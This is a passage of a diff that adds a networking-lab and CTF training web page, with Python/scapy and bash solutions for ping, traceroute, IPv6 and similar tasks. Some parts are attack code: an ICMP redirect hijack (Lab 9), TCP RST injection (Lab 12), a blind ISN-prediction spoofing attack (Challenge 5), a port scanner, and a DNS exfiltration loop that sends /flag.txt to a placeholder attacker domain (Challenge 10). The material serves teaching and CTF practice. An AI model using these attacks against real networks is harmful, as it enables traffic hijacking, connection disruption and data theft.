+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+msg = input("Message: ")
+client.sendto(msg.encode(), ("127.0.0.1", 9999))
+data, addr = client.recvfrom(1024)
+print(f"Server replied: {data.decode()}")
+client.close()</code></pre>
+<pre><code class="language-bash"># Capture and compare with TCP — notice no 3-way handshake
+sudo tcpdump -i lo port 9999 -nn</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 6 -->
+        <div class="lab-card">
+          <h4>Lab 6: ICMP Ping Implementation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Implement ICMP echo request/reply from scratch using raw sockets. Calculate the checksum manually.</p>
+          <div class="setup-code">
+<pre><code class="language-python">import socket
+import struct
+import os
+import time
+
+def checksum(data):
+    if len(data) % 2:
+        data += b'\x00'
+    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
+    s = (s >> 16) + (s & 0xffff)
+    s += s >> 16
+    return ~s & 0xffff
+
+def ping(dest, count=4):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    sock.settimeout(2)
+    dest_ip = socket.gethostbyname(dest)
+
+    for seq in range(count):
+        # ICMP Echo Request: type=8, code=0
+        pid = os.getpid() & 0xFFFF
+        header = struct.pack('!BBHHH', 8, 0, 0, pid, seq)
+        payload = struct.pack('!d', time.time())
+        chk = checksum(header + payload)
+        header = struct.pack('!BBHHH', 8, 0, chk, pid, seq)
+
+        sock.sendto(header + payload, (dest_ip, 0))
+        try:
+            data, addr = sock.recvfrom(1024)
+            icmp_header = data[20:28]
+            rtype, code, _, r_id, r_seq = struct.unpack('!BBHHH', icmp_header)
+            send_time = struct.unpack('!d', data[28:36])[0]
+            rtt = (time.time() - send_time) * 1000
+            print(f"Reply from {addr[0]}: seq={r_seq} time={rtt:.1f}ms")
+        except socket.timeout:
+            print(f"Request timed out (seq={seq})")
+    sock.close()
+
+ping("8.8.8.8")</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 7 -->
+        <div class="lab-card">
+          <h4>Lab 7: TCP State Machine Tracker</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Sniff TCP traffic and track connection states (SYN_SENT → ESTABLISHED → FIN_WAIT, etc.) in real time.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+from collections import defaultdict
+
+connections = defaultdict(lambda: "CLOSED")
+
+def track_state(pkt):
+    if not pkt.haslayer(TCP):
+        return
+    src = f"{pkt[IP].src}:{pkt[TCP].sport}"
+    dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"
+    key = tuple(sorted([src, dst]))
+    flags = pkt[TCP].flags
+
+    old = connections[key]
+    if flags == "S":
+        connections[key] = "SYN_SENT"
+    elif flags == "SA":
+        connections[key] = "SYN_RECEIVED"
+    elif flags == "A" and old == "SYN_RECEIVED":
+        connections[key] = "ESTABLISHED"
+    elif "F" in str(flags):
+        if old == "ESTABLISHED":
+            connections[key] = "FIN_WAIT_1"
+        elif old == "FIN_WAIT_1":
+            connections[key] = "TIME_WAIT"
+    elif "R" in str(flags):
+        connections[key] = "CLOSED"
+
+    if connections[key] != old:
+        print(f"[{key[0]} ↔ {key[1]}] {old} → {connections[key]}  [{flags}]")
+
+print("[*] Tracking TCP states... (Ctrl+C to stop)")
+sniff(filter="tcp", prn=track_state, store=0)</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 8 -->
+        <div class="lab-card">
+          <h4>Lab 8: IP Fragmentation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Fragment IP packets with scapy, send them, and reassemble on the receiving end. Understand MF flag and fragment offset.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+target = "127.0.0.1"
+
+# Create a large ICMP packet and let scapy fragment it
+large_payload = b"A" * 3000
+pkt = IP(dst=target, flags="MF") / ICMP() / Raw(load=large_payload)
+
+# Manual fragmentation
+frags = fragment(pkt, fragsize=500)
+print(f"[+] Split into {len(frags)} fragments")
+for i, f in enumerate(frags):
+    print(f"  Frag {i}: offset={f[IP].frag}, MF={f[IP].flags}, size={len(f)}")
+
+# Send fragments
+for f in frags:
+    send(f, verbose=0)
+
+# Reassemble from a pcap
+# Capture with: sudo tcpdump -i lo icmp -w frags.pcap
+pkts = rdpcap("frags.pcap")
+reassembled = defragment(pkts)
+print(f"[+] Reassembled {len(reassembled)} packets")</code></pre>
+<pre><code class="language-bash"># Observe fragmentation with ping
+ping -s 4000 -c 1 127.0.0.1
+# Capture and inspect in Wireshark: ip.flags.mf == 1</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 9 -->
+        <div class="lab-card">
+          <h4>Lab 9: ICMP Redirect Attack with Scapy</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Craft ICMP redirect messages to manipulate a victim's routing table, redirecting traffic through your machine.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+victim = "192.168.1.100"
+real_gw = "192.168.1.1"
+attacker = "192.168.1.50"
+target_net = "10.0.0.0"
+
+# ICMP Redirect (type 5, code 1 = redirect for host)
+# Tells victim: "To reach target_net, use attacker as gateway"
+redirect = IP(src=real_gw, dst=victim) / \
+           ICMP(type=5, code=1, gw=attacker) / \
+           IP(src=victim, dst=target_net) / \
+           TCP(sport=12345, dport=80)
+
+send(redirect, count=5, inter=1)
+print(f"[+] Sent ICMP redirect: {victim} should now route {target_net} via {attacker}")</code></pre>
+<pre><code class="language-bash"># Verify on victim
+ip route get 10.0.0.1
+# Should show route via attacker IP
+
+# Defense: disable ICMP redirect acceptance
+sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
+sudo sysctl -w net.ipv4.conf.all.secure_redirects=0</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 10 -->
+        <div class="lab-card">
+          <h4>Lab 10: TTL-based Traceroute</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Implement traceroute from scratch by incrementing TTL and capturing ICMP Time Exceeded responses.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+def traceroute_custom(target, max_hops=30):
+    target_ip = socket.gethostbyname(target)
+    print(f"Traceroute to {target} ({target_ip}), max {max_hops} hops\n")
+
+    for ttl in range(1, max_hops + 1):
+        pkt = IP(dst=target_ip, ttl=ttl) / ICMP()
+        reply = sr1(pkt, timeout=2, verbose=0)
+
+        if reply is None:
+            print(f"{ttl:3d}  * * * (no response)")
+        elif reply[ICMP].type == 11:  # Time Exceeded
+            try:
+                hostname = socket.gethostbyaddr(reply[IP].src)[0]
+            except socket.herror:
+                hostname = reply[IP].src
+            rtt = (reply.time - pkt.sent_time) * 1000
+            print(f"{ttl:3d}  {hostname} ({reply[IP].src})  {rtt:.1f} ms")
+        elif reply[ICMP].type == 0:   # Echo Reply — destination reached
+            rtt = (reply.time - pkt.sent_time) * 1000
+            print(f"{ttl:3d}  {target_ip}  {rtt:.1f} ms  *** Destination reached ***")
+            break
+
+traceroute_custom("google.com")</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 11 -->
+        <div class="lab-card">
+          <h4>Lab 11: IPv6 Basics &amp; Raw Socket Programming</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Send and receive IPv6 packets. Explore neighbor discovery, ICMPv6, and differences from IPv4.</p>
+          <div class="setup-code">
+<pre><code class="language-python">import socket
+
+# IPv6 TCP client
+sock6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+sock6.settimeout(5)
+# Connect to IPv6 loopback
+sock6.connect(("::1", 8080))
+sock6.send(b"Hello IPv6\n")
+print(sock6.recv(1024).decode())
+sock6.close()</code></pre>
+<pre><code class="language-python">from scapy.all import *
+
+# ICMPv6 echo request (ping6)
+pkt = IPv6(dst="::1") / ICMPv6EchoRequest()
+resp = sr1(pkt, timeout=2)
+resp.show()
+
+# IPv6 neighbor solicitation (equivalent of ARP)
+ns = IPv6(dst="ff02::1") / ICMPv6ND_NS(tgt="fe80::1")
+ans = sr1(ns, timeout=2, verbose=0)
+if ans:
+    print(f"MAC: {ans[ICMPv6NDOptDstLLAddr].lladdr}")
+
+# Scan local link-local addresses
+ans, _ = srp(Ether(dst="33:33:00:00:00:01") /
+             IPv6(dst="ff02::1") /
+             ICMPv6EchoRequest(),
+             timeout=3, verbose=0)
+for s, r in ans:
+    print(f"  {r[IPv6].src}")</code></pre>
+<pre><code class="language-bash"># System commands
+ip -6 addr show
+ping6 ::1
+ip -6 neigh show</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 12 -->
+        <div class="lab-card">
+          <h4>Lab 12: TCP RST Injection &amp; Multi-threaded Server</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Inject TCP RST packets to kill an active connection, and build a multi-threaded server with proper socket timeout and byte-order handling.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># Part A: TCP RST Injection — kill a connection between two hosts
+from scapy.all import *
+
+target_ip = "192.168.1.100"
+server_ip = "192.168.1.200"
+server_port = 80
+
+def rst_inject(pkt):
+    """Sniff traffic and inject RST to kill the connection."""
+    if pkt.haslayer(TCP) and pkt[IP].src == target_ip and pkt[TCP].dport == server_port:
+        rst = IP(src=server_ip, dst=target_ip) / TCP(
+            sport=server_port,
+            dport=pkt[TCP].sport,
+            flags="R",
+            seq=pkt[TCP].ack
+        )
+        send(rst, verbose=0)
+        print(f"[+] RST injected to {target_ip}:{pkt[TCP].sport}")
+
+sniff(filter=f"tcp and host {target_ip} and port {server_port}",
+      prn=rst_inject, store=0)</code></pre>
+<pre><code class="language-python"># Part B: Multi-threaded server with timeouts &amp; byte order
+import socket
+import struct
+import threading
+
+def handle_client(conn, addr):
+    conn.settimeout(10)  # 10 second timeout per client
+    try:
+        # Receive a 4-byte network-order integer
+        raw = conn.recv(4)
+        value = socket.ntohl(struct.unpack('!I', raw)[0])
+        print(f"[+] {addr}: received {value} (net order: {raw.hex()})")
+
+        # Send back value + 1 in network byte order
+        result = socket.htonl(value + 1)
+        conn.send(struct.pack('!I', result))
+    except socket.timeout:
+        print(f"[-] {addr}: timed out")
+    finally:
+        conn.close()
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server.bind(("0.0.0.0", 5555))
+server.listen(10)
+print("[*] Multi-threaded server on :5555")
+
+while True:
+    conn, addr = server.accept()
+    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()</code></pre>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ==================== CTF TAB ==================== -->
+      <div class="tab-content" id="ctf">
+
+        <!-- Challenge 1 -->
+        <div class="ctf-card">
+          <h4>Challenge 1: Math Bot</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A remote service sends you a math challenge. You have 2 seconds to solve it and send the answer. Do this 50 times to get the flag. Connect to <code>challenge.ctf.com:31337</code>.</p>
+
+          <h5>Approach</h5>
+          <ul>
+            <li>Connect via TCP, parse the math expression from the server's message</li>
+            <li>Evaluate it and send the result back before the timeout</li>
+            <li>Repeat for all rounds</li>
+          </ul>
+
+          <h5>Solution</h5>
+<pre><code class="language-python">from pwn import *
+
+r = remote("challenge.ctf.com", 31337)
+
+for i in range(50):
+    line = r.recvline().decode().strip()
+    log.info(f"Round {i+1}: {line}")
+
+    # Extract the math expression (e.g., "What is 1234 + 5678?")
+    # Adjust parsing based on actual server output
+    expr = line.split("What is ")[1].rstrip("?")
+
+    # Safely evaluate (only handles +, -, *, //)
+    # Never use eval() on untrusted input in production
+    allowed_chars = set("0123456789+-*/ ()")
+    if all(c in allowed_chars for c in expr):
+        result = eval(expr)
+    else:
+        log.warning(f"Unexpected expression: {expr}")
+        result = 0
+
+    r.sendline(str(result).encode())
+    log.success(f"Sent: {result}")
+
+# Get the flag
+flag = r.recvall(timeout=3).decode()
+print(flag)</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> If the server sends expressions like "1337 * 42 + 7", Python's <code>eval()</code> handles order of operations correctly. Watch out for integer division — the server might expect floor division. Also check if the server sends the expression on the same line as other text.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 2 -->
+        <div class="ctf-card">
+          <h4>Challenge 2: Packet Gatekeeper</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A service on <code>challenge.ctf.com:1337</code> only accepts connections from a specific "magic" source port and requires a TCP packet with the URG flag set and a specific urgent pointer value. Craft the right packet to unlock the flag.</p>
+
+          <h5>Approach</h5>
+          <ul>
+            <li>The challenge hints suggest: source port must be <code>31337</code>, URG flag must be set, urgent pointer = <code>0xBEEF</code></li>
+            <li>Normal sockets don't let you set URG pointer values easily — use scapy for raw packet crafting</li>
+            <li>Complete the TCP handshake first, then send the crafted data packet</li>
+          </ul>
+
+          <h5>Solution</h5>
+<pre><code class="language-python">from scapy.all import *
+
+target = "challenge.ctf.com"
+dport = 1337
+sport = 31337
+
+# Step 1: SYN with specific source port
+syn = IP(dst=target) / TCP(sport=sport, dport=dport, flags="S", seq=1000)
+syn_ack = sr1(syn, timeout=3)
+
+if syn_ack is None or syn_ack[TCP].flags != 0x12:
+    print("[-] Handshake failed")
+    exit()
+
+# Step 2: Complete handshake
+ack_seq = syn_ack[TCP].ack
+srv_seq = syn_ack[TCP].seq + 1
+ack = IP(dst=target) / TCP(sport=sport, dport=dport, flags="A", seq=ack_seq, ack=srv_seq)
+send(ack)
+
+# Step 3: Send crafted packet with URG flag and specific urgent pointer
+payload = b"UNLOCK"
+crafted = IP(dst=target) / TCP(
+    sport=sport,
+    dport=dport,
+    flags="PAU",         # PSH + ACK + URG
+    seq=ack_seq,
+    ack=srv_seq,
+    urgptr=0xBEEF
+) / Raw(load=payload)
+
+resp = sr1(crafted, timeout=5)
+if resp and resp.haslayer(Raw):
+    print(f"[+] Flag: {resp[Raw].load.decode()}")
+else:
+    # Try sniffing for delayed response
+    pkts = sniff(filter=f"src host {target} and src port {dport}", timeout=5)
+    for p in pkts:
+        if p.haslayer(Raw):
+            print(f"[+] {p[Raw].load.decode()}")</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> You can't use normal Python sockets for this — you need raw packet control. Scapy's TCP flags field accepts string combinations: <code>"S"</code> for SYN, <code>"SA"</code> for SYN-ACK, <code>"PAU"</code> for PSH+ACK+URG. The <code>urgptr</code> field is a standard TCP header field. Make sure to complete the 3-way handshake before sending data, or the server will RST your connection.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 3 -->
+        <div class="ctf-card">
+          <h4>Challenge 3: Recon Ranger</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Given a target IP, build a port scanner that identifies all open TCP ports (1-10000), performs banner grabbing, and identifies the service running on each open port. The flag is hidden in one of the service banners, but only appears if you connect with the correct User-Agent header.</p>
+
+          <h5>Approach</h5>
+          <ul>
+            <li>SYN scan for speed, then TCP connect for banner grabbing</li>
+            <li>Use threading to scan the full range in reasonable time</li>
+            <li>For HTTP services, send a request with a custom User-Agent</li>
+            <li>Parse banners for the flag format: <code>flag{...}</code></li>
+          </ul>
+
+          <h5>Solution</h5>
+<pre><code class="language-python">import socket
+import threading
+import re
+from queue import Queue
+
+target = "challenge.ctf.com"
+open_ports = []
+lock = threading.Lock()
+q = Queue()
+
+def scan_port(port):
+    """TCP connect scan on a single port."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        result = s.connect_ex((target, port))
+        if result == 0:
+            with lock:
+                open_ports.append(port)
+        s.close()
+    except Exception:
+        pass
+
+def worker():
+    while not q.empty():
+        port = q.get()
+        scan_port(port)
+        q.task_done()
+
+# Phase 1: Port scan with 100 threads
+print(f"[*] Scanning {target} ports 1-10000...")
+for port in range(1, 10001):
+    q.put(port)
+
+threads = []
+for _ in range(100):
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
+    threads.append(t)
+
+q.join()
+open_ports.sort()
+print(f"[+] Open ports: {open_ports}")
+
+# Phase 2: Banner grabbing
+def grab_banner(port):
+    """Connect and grab the banner, trying multiple probes."""
+    banners = []
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        s.connect((target, port))
+
+        # Try receiving a banner immediately (SSH, FTP, SMTP)
+        try:
+            banner = s.recv(4096).decode(errors="ignore").strip()
+            if banner:
+                banners.append(banner)
+        except socket.timeout:
+            pass
+
+        # Try HTTP probe with custom User-Agent
+        http_req = (
+            f"GET / HTTP/1.1\r\n"
+            f"Host: {target}\r\n"
+            f"User-Agent: CTF-Scanner/1.0\r\n"
+            f"\r\n"
+        )
+        s.send(http_req.encode())
+        try:
+            resp = s.recv(4096).decode(errors="ignore")
+            if resp:
+                banners.append(resp)
+        except socket.timeout:
+            pass
+
+        s.close()
+    except Exception as e:
+        banners.append(f"Error: {e}")
+
+    return "\n".join(banners)
+
+print("\n[*] Grabbing banners...")
+for port in open_ports:
+    banner = grab_banner(port)
+    print(f"\n--- Port {port} ---")
+    print(banner[:500] if banner else "(no banner)")
+
+    # Check for flag
+    flags = re.findall(r'flag\{[^}]+\}', banner)
+    if flags:
+        print(f"\n[!!!] FLAG FOUND on port {port}: {flags[0]}")
+
+print("\n[+] Scan complete.")</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Some services only reveal the flag after receiving specific input. If your basic banner grab doesn't find it, try: (1) Different HTTP methods (POST, OPTIONS), (2) Sending the string "flag" or "help" to non-HTTP services, (3) Checking if any service responds differently to specific User-Agent strings. The flag is on a non-standard port, so don't skip the full range scan. Use threading to keep the scan under 60 seconds.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 4 -->
+        <div class="ctf-card">
+          <h4>Challenge 4: Protocol Identifier</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A pcap contains traffic from 10 different application-layer protocols. Identify all 10 and submit them sorted alphabetically. Flag format: <code>flag{proto1_proto2_..._proto10}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Extract protocol list from pcap
+tshark -r mystery.pcap -z io,phs -q
+# Or use Wireshark: Statistics → Protocol Hierarchy
+
+# Filter for specific protocols
+tshark -r mystery.pcap -Y "dns" -c 1
+tshark -r mystery.pcap -Y "http" -c 1
+tshark -r mystery.pcap -Y "ftp" -c 1</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>tshark -z io,phs</code> for a full protocol hierarchy. Look beyond common protocols — check for SNMP, DHCP, TFTP, IMAP, NTP. Some may only appear in 1-2 packets.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 5 -->
+        <div class="ctf-card">
+          <h4>Challenge 5: TCP Sequence Predictor</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A server uses a weak ISN (Initial Sequence Number) generator. Observe 5 connections, predict the 6th ISN, and spoof a trusted IP to inject a command. The flag is returned if the predicted sequence number is correct.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+target = "challenge.ctf.com"
+trusted_ip = "10.0.0.1"
+
+# Step 1: Collect ISNs from multiple connections
+isns = []
+for i in range(5):
+    syn = IP(dst=target) / TCP(dport=9999, flags="S", sport=RandShort())
+    resp = sr1(syn, timeout=2, verbose=0)
+    if resp and resp.haslayer(TCP):
+        isns.append(resp[TCP].seq)
+        # RST to clean up
+        send(IP(dst=target) / TCP(dport=9999, sport=syn[TCP].sport,
+             flags="R", seq=resp[TCP].ack), verbose=0)
+
+# Step 2: Analyze the pattern and predict next ISN
+diffs = [isns[i+1] - isns[i] for i in range(len(isns)-1)]
+print(f"ISNs: {isns}")
+print(f"Diffs: {diffs}")
+predicted_isn = isns[-1] + diffs[-1]
+
+# Step 3: Spoof connection with predicted ISN
+syn = IP(src=trusted_ip, dst=target) / TCP(dport=9999, flags="S",
+      sport=31337, seq=1000)
+# Blind ACK with predicted server ISN
+ack = IP(src=trusted_ip, dst=target) / TCP(dport=9999, flags="A",
+      sport=31337, seq=1001, ack=predicted_isn + 1)
+send(ack, verbose=0)
+
+# Send command
+cmd = IP(src=trusted_ip, dst=target) / TCP(dport=9999, flags="PA",
+      sport=31337, seq=1001, ack=predicted_isn + 1) / Raw(b"GETFLAG\n")
+send(cmd, verbose=0)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The ISN increments by a constant value each connection. Calculate the difference between consecutive ISNs — it should be consistent. Add that delta to the last observed ISN. Since you're spoofing, you won't see the SYN-ACK, so this is a blind injection.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 6 -->
+        <div class="ctf-card">
+          <h4>Challenge 6: Fragmented Flag</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A pcap contains an ICMP packet carrying the flag, but it was fragmented into many small pieces. Some fragments are duplicates, some are out of order. Reassemble them to recover the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+pkts = rdpcap("fragmented.pcap")
+
+# Filter IP fragments
+fragments = [p for p in pkts if p.haslayer(IP) and
+             (p[IP].flags == 1 or p[IP].frag > 0)]
+
+print(f"[+] Found {len(fragments)} fragments")
+
+# Group by IP ID and reassemble
+from collections import defaultdict
+groups = defaultdict(list)
+for f in fragments:
+    groups[f[IP].id].append(f)
+
+for ip_id, frags in groups.items():
+    frags.sort(key=lambda x: x[IP].frag)
+    data = b""
+    for f in frags:
+        data += bytes(f[IP].payload)[8:]  # skip ICMP header in first frag
+    print(f"ID {ip_id}: {data}")</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use scapy's <code>defragment()</code> function first. If that doesn't work due to duplicates, manually group fragments by IP ID, sort by fragment offset, and concatenate payloads. Watch for overlapping fragments — the attacker may have inserted decoys.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 7 -->
+        <div class="ctf-card">
+          <h4>Challenge 7: TCP Covert Channel</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A pcap shows normal-looking HTTP traffic, but data is being exfiltrated in TCP header fields. Extract the hidden message from the covert channel.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+pkts = rdpcap("covert_tcp.pcap")
+hidden = ""
+
+for pkt in pkts:
+    if pkt.haslayer(TCP) and pkt[TCP].dport == 80:
+        # Check TCP urgent pointer for hidden data
+        if pkt[TCP].urgptr != 0:
+            hidden += chr(pkt[TCP].urgptr)
+        # Or check TCP ISN low byte
+        # hidden += chr(pkt[TCP].seq &amp; 0xFF)
+        # Or check IP ID field
+        # hidden += chr(pkt[IP].id &amp; 0xFF)
+
+print(f"Hidden message: {hidden}")</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Common TCP covert channels hide data in: urgent pointer, initial sequence number (low byte), IP identification field, TCP timestamp option, or TCP window size. Try extracting each field from packets to port 80 and look for printable ASCII or a flag pattern. Only outbound packets carry the hidden data.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 8 -->
+        <div class="ctf-card">
+          <h4>Challenge 8: UDP Calculator Service</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A UDP service on port 4444 accepts math expressions as datagrams and returns the result. Solve 100 problems in under 30 seconds. Each answer must be sent as a network-byte-order 32-bit integer.</p>
+          <div class="setup-code">
+<pre><code class="language-python">import socket
+import struct
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.settimeout(5)
+server = ("challenge.ctf.com", 4444)
+
+# Send START to begin
+sock.sendto(b"START", server)
+
+for i in range(100):
+    data, _ = sock.recvfrom(1024)
+    expr = data.decode().strip()
+    result = int(eval(expr))  # safe: server only sends digits and operators
+    sock.sendto(struct.pack('!i', result), server)
+
+# Receive flag
+flag, _ = sock.recvfrom(1024)
+print(flag.decode())</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The key is the network byte order requirement — use <code>struct.pack('!i', value)</code>. If you send ASCII strings instead of packed integers, the server silently drops your answer. Watch for negative results that need signed packing.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 9 -->
+        <div class="ctf-card">
+          <h4>Challenge 9: IPv6 Hidden Service</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The challenge server is dual-stacked but the flag endpoint only responds on IPv6. Discover the server's IPv6 address and retrieve the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Resolve AAAA record
+dig AAAA challenge.ctf.com +short
+
+# Connect via IPv6
+curl -6 http://[2001:db8::1]:8080/flag
+nc -6 2001:db8::1 8080
+
+# If no AAAA record, try neighbor discovery on local link
+ping6 ff02::1%eth0
+ip -6 neigh show</code></pre>
+<pre><code class="language-python">import socket
+
+# IPv6 connection
+sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+sock.connect(("2001:db8::1", 8080))
+sock.send(b"GET /flag HTTP/1.1\r\nHost: challenge\r\n\r\n")
+print(sock.recv(4096).decode())
+sock.close()</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Check DNS AAAA records. If the IPv6 address isn't published, look for it in a TXT record or in the IPv4 HTTP headers (<code>X-IPv6-Address</code>). The flag endpoint returns 404 on IPv4 but 200 on IPv6.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 10 -->
+        <div class="ctf-card">
+          <h4>Challenge 10: Bandwidth-Limited Exfiltration</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">You have a shell on a target but egress is rate-limited to 1 packet per second and max 64 bytes per packet. Exfiltrate the flag file (<code>/flag.txt</code>) through DNS queries to your controlled domain.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># On your DNS server — capture incoming queries
+from scapy.all import *
+
+received = {}
+
+def dns_listener(pkt):
+    if pkt.haslayer(DNSQR):
+        qname = pkt[DNSQR].qname.decode()
+        if "exfil.yourdomain.com" in qname:
+            parts = qname.split(".")
+            seq, data = int(parts[0]), parts[1]
+            received[seq] = data
+            print(f"[+] Chunk {seq}: {data}")
+
+sniff(filter="udp port 53", prn=dns_listener, store=0)</code></pre>
+<pre><code class="language-bash"># On the target — exfiltrate file via DNS
+FLAG=$(cat /flag.txt | xxd -p | tr -d '\n')
+SEQ=0
+while [ -n "$FLAG" ]; do
+  CHUNK="${FLAG:0:40}"
+  FLAG="${FLAG:40}"
+  dig "$SEQ.$CHUNK.exfil.yourdomain.com" @your_dns_ip +short
+  SEQ=$((SEQ + 1))
+  sleep 1
+done</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>DNS labels max out at 63 characters. Hex-encode the flag, split into chunks of ~40 chars, and send as subdomain labels. Each DNS query is one packet under 64 bytes. Reassemble on your server by sorting chunk sequence numbers and decoding the hex.</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</body>
+</html>
